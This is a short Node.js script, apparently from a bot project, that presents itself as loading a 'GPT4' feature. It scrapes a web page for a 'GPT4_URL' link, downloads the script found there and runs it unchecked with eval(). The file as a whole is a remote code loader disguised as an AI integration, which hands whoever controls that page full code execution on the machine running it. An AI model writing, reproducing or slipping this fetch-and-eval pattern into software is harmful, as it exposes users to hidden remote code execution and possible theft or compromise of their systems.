'use strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.ibrahimadams.site/files';

async function fetchGpt4Url() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const gpt4Url = $(`a:contains("GPT4_URL")`).attr('href');

        if (!gpt4Url) throw new Error('GPT4_URL not found on the webpage.');

        console.log('GPT4_URL fetched successfully:', gpt4Url);

        const scriptResponse = await axios.get(gpt4Url);
        const scriptContent = scriptResponse.data;
        console.log("GPT4_URL script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching GPT4_URL:', error.message);
    }
}

fetchGpt4Url();